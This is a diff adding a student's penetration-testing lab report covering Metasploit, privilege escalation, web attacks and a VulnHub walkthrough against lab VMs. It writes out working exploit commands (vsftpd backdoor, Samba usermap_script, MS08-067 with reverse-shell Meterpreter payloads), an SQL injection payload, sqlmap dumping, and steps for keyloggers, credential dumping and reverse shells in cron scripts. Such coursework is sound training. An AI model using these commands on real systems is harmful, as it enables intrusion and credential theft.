@@ -1,0 +1,91 @@
+1. Exploitation Frameworks
+Metasploit Framework Usage:
+•	Metasploit (msfconsole):
+o	Launched msfconsole and configured exploits with payloads for both Linux and Windows targets.
+o	Example: Exploiting Metasploitable2's vulnerable vsftpd version:
+o	use exploit/unix/ftp/vsftpd_234_backdoor
+o	set RHOST 192.168.56.102
+o	run
+	Successfully gained shell access.
+•	Linux Exploitation:
+o	Exploited Samba on Metasploitable2 using:
+o	use exploit/multi/samba/usermap_script
+	Payload: linux/x86/meterpreter/reverse_tcp
+	Post-exploitation modules used to enumerate users, dump credentials, and identify privilege escalation paths.
+•	Windows Exploitation:
+o	Used a Windows 7 SP1 VM with known MS08-067 vulnerability.
+o	Exploited via:
+o	use exploit/windows/smb/ms08_067_netapi
+o	set PAYLOAD windows/meterpreter/reverse_tcp
+o	set RHOST <target_IP>
+o	exploit
+	Gained Meterpreter session and uploaded keyloggers, collected system info, and pivoted internally.
+
+
+2. Privilege Escalation
+Linux Privilege Escalation Techniques:
+•	SUID Binaries:
+o	Searched for SUID binaries:
+o	find / -perm -4000 -type f 2>/dev/null
+	Exploited /usr/bin/nmap (interactive mode) for shell access.
+•	Cron Jobs:
+o	Discovered writable cron scripts in /etc/cron.d/ triggering every minute.
+o	Injected reverse shell script and escalated privileges.
+•	Environment Variables:
+o	Identified scripts run with elevated privileges that used system binaries without full paths.
+o	Overrode $PATH to point to a malicious binary (e.g., a fake ls) to gain elevated shell access.
+Windows Privilege Escalation Techniques:
+•	Unquoted Service Paths:
+o	Identified misconfigured service paths using:
+o	wmic service get name,displayname,pathname,startmode
+	Placed a malicious program.exe in C:\Program Files\ directory.
+	On reboot or service restart, the binary was executed with SYSTEM privileges.
+•	Insecure Services:
+o	Modified configuration of an insecure service (write access) to point to a reverse shell binary.
+o	Restarted the service for privilege escalation.
+•	Token Impersonation (using Incognito in Meterpreter):
+o	Used meterpreter > impersonate_token to elevate privileges after identifying admin tokens.
+
+
+3. Web Application Hacking
+OWASP Top 10 Concepts Practiced:
+•	Studied and identified vulnerabilities like:
+o	XSS (Cross-Site Scripting)
+o	SQLi (SQL Injection)
+o	CSRF (Cross-Site Request Forgery)
+o	Insecure Direct Object References
+o	Broken Authentication & Session Management
+Burp Suite Usage:
+•	Intercepted and modified HTTP requests.
+•	Performed manual fuzzing and observed session tokens and cookies.
+•	Manipulated GET and POST parameters to uncover logic flaws.
+SQL Injection (Manual & Automated):
+•	Manual Injection:
+o	Injected payloads like ' OR 1=1 -- into vulnerable login forms.
+o	Accessed user databases and dumped credentials using UNION-based injections.
+•	sqlmap Automation:
+o	Used sqlmap:
+o	sqlmap -u "http://192.168.56.102/login.php?user=admin" --dump
+	Enumerated tables, databases, and extracted user hashes.
+
+
+4. Hands-On Tasks
+VulnHub Exploitation (Mr. Robot VM):
+•	Enumeration:
+o	Performed full Nmap scan:
+o	nmap -sC -sV -oA robot 192.168.56.104
+	Found HTTP and SSH services.
+•	Web Enumeration:
+o	Used Dirb to uncover hidden directories like /robots.txt, /fsocity.dic, and /admin.
+•	Exploitation:
+o	Exploited a WordPress vulnerability and gained initial shell access.
+o	Found a vulnerable user-owned script scheduled by cron.
+•	Privilege Escalation:
+o	Used GTFOBins to find an executable with SUID privilege (e.g., nmap).
+o	Spawned root shell and captured the final flag.
+Summary:
+•	Gained root on Mr. Robot VM via realistic exploitation chain:
+o	Web app exploitation → local enumeration → privilege escalation.
+
+Conclusion
+This module provided a full penetration testing workflow: reconnaissance → exploitation → privilege escalation → data extraction. I developed practical skills in handling Metasploit payloads, analyzing vulnerabilities, and gaining root/admin access on vulnerable systems. Web application testing with Burp Suite and sqlmap deepened my understanding of modern threats. These exercises reflect real-world penetration testing scenarios and highlight the importance of layered defenses and secure configurations.
